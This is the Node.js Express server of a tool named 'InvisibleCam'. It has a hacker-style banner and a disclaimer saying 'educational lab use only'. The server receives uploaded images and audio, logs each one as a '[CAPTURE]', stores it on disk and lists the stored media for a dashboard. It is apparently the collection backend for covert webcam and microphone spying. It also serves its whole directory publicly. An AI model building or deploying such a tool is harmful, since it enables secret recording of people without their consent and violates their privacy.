const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3000;

// ================================================================
//  CINEMATIC STARTUP BANNER
// ================================================================
const RED = '\x1b[38;5;196m';
const GREEN = '\x1b[38;5;46m';
const RST = '\x1b[0m';
const BOLD = '\x1b[1m';

const BANNER = [
    `${RED}  ██╗███╗   ██╗██╗   ██╗██╗███████╗██╗██████╗ ██╗     ███████╗`,
    `${RED}  ██║████╗  ██║██║   ██║██║██╔════╝██║██╔══██╗██║     ██╔════╝`,
    `${RED}  ██║██╔██╗ ██║██║   ██║██║███████╗██║██████╔╝██║     █████╗`,
    `${RED}  ██║██║╚██╗██║╚██╗ ██╔╝██║╚════██║██║██╔══██╗██║     ██╔══╝`,
    `${RED}  ██║██║ ╚████║ ╚████╔╝ ██║███████║██║██████╔╝███████╗███████╗`,
    `${RED}  ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝`,
    '',
    `${RED}   ██████╗ █████╗ ███╗   ███╗`,
    `${RED}  ██╔════╝██╔══██╗████╗ ████║`,
    `${RED}  ██║     ███████║██╔████╔██║`,
    `${RED}  ██║     ██╔══██║██║╚██╔╝██║`,
    `${RED}  ╚██████╗██║  ██║██║ ╚═╝ ██║`,
    `${RED}   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝`,
    '',
    `${RED}  Made by Nuhu Tahiru | Version 1.0`,
    `${RED}  *** DISCLAIMER: Educational lab use only. Do NOT use for harmful activity. ***`,
    '',
];

// Type out effect
function typeOut(text, delay = 2) {
    for (let i = 0; i < text.length; i++) {
        process.stdout.write(text[i]);
        const start = Date.now();
        while (Date.now() - start < delay) {}
    }
    process.stdout.write('\n');
}

// Startup sequence
console.clear();
console.log(`${GREEN}[*] Initializing InvisibleCam...${RST}`);
setTimeout(() => console.log(`${GREEN}[*] Loading camera module... [OK]${RST}`), 400);
setTimeout(() => console.log(`${GREEN}[*] Loading audio module... [OK]${RST}`), 700);
setTimeout(() => console.log(`${GREEN}[*] Starting server...${RST}`), 1000);
setTimeout(() => {
    console.log('');
    BANNER.forEach(line => process.stdout.write(line + '\n'));
    console.log(`${GREEN}  >>> Server: http://localhost:${PORT}${RST}`);
    console.log(`${GREEN}  >>> Dashboard: http://localhost:${PORT}/dashboard.html${RST}`);
    console.log('');
}, 1200);

// ================================================================
//  FILE STORAGE
// ================================================================

const COUNTER_FILE = path.join(__dirname, 'counters.json');
let counters = { image: 1, audio: 1 };

if (fs.existsSync(COUNTER_FILE)) {
    counters = JSON.parse(fs.readFileSync(COUNTER_FILE, 'utf-8'));
}

const saveCounters = () => {
    fs.writeFileSync(COUNTER_FILE, JSON.stringify(counters, null, 2));
};

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, __dirname),
    filename: (req, file, cb) => {
        let filename;
        if (file.mimetype.startsWith('image/')) {
            filename = `${counters.image++}.jpg`;
        } else if (file.mimetype.startsWith('audio/')) {
            filename = `${counters.audio++}.webm`;
        }
        saveCounters();
        cb(null, filename);
    }
});

const upload = multer({ storage });

app.use(express.static(path.join(__dirname)));

app.post('/upload-image', upload.single('image'), (req, res) => {
    console.log(`${RED}[CAPTURE] Image: ${req.file.filename}${RST}`);
    res.sendStatus(200);
});

app.post('/upload-audio', upload.single('audio'), (req, res) => {
    console.log(`${RED}[CAPTURE] Audio: ${req.file.filename}${RST}`);
    res.sendStatus(200);
});

app.get('/uploaded-media', (req, res) => {
    try {
        const files = fs.readdirSync(__dirname);
        const media = files
            .filter(file => file.endsWith('.jpg') || file.endsWith('.webm'))
            .map(file => ({
                url: `/${file}`,
                type: file.endsWith('.jpg') ? 'image' : 'audio'
            }));
        res.json(media);
    } catch (error) {
        res.status(500).send('Unable to fetch media');
    }
});

app.listen(PORT);
